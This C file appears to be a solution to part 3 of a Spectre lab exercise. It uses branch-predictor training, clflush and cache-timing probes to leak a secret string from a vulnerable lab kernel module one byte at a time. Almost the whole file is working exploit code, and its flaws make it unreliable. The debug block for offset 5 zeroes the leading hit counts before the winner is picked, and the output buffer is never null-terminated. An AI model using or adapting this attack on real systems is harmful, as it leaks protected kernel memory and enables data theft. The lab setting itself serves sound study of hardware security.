/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define DRAM_THRESHOLD 200
#define TRAINING_LOOPS 10

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        uint64_t results[256] = {0};

        for (int tries = 0; tries < 30; tries++) {

            // Flush probe array
            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
            }
            asm volatile("mfence" ::: "memory");

            // Train
            if (tries % 5 == 0) {
                for (int j = 0; j < 10; j++) {
                    call_kernel_part3(kernel_fd, shared_memory, 0);
                }
            }

            // Flush again but DON'T madvise — just flush and a lightweight delay
            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
            }
            
            // Small busy-wait to let part3_limit age out without a syscall
            // (syscalls would re-cache it)
            for (volatile int delay = 0; delay < 100; delay++);
            
            asm volatile("mfence" ::: "memory");

            call_kernel_part3(kernel_fd, shared_memory, current_offset);

            // Randomized probe order, skip 0
            for (int i = 1; i < 256; i++) {
                size_t rand_i = ((i * 167) % 255) + 1;
                size_t idx = rand_i * SHD_SPECTRE_LAB_PAGE_SIZE;
                uint64_t t = time_access(shared_memory + idx);
                if (t < DRAM_THRESHOLD) {
                    results[rand_i]++;
                }
            }
        }

        // After scoring, print top 5 candidates for offset 5
        if (current_offset == 5) {
            printf("Top candidates for offset 5:\n");
            // Sort and print top 5
            for (int rank = 0; rank < 5; rank++) {
                int best = 0;
                for (int i = 1; i < 256; i++) {
                    if (results[i] > results[best]) best = i;
                }
                if (results[best] > 0) {
                    printf("  '%c' (0x%02x) = %lu hits\n", 
                        (best >= 32 && best < 127) ? best : '?', 
                        best, results[best]);
                }
                results[best] = 0; // zero it out to find next best
            }
        }

        // Pick the winner (highest hit count)
        int best_val = 0;
        for (int i = 1; i < 256; i++) {
            if (results[i] > results[best_val]) best_val = i;
        }
        leaked_str[current_offset] = (char)best_val;
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
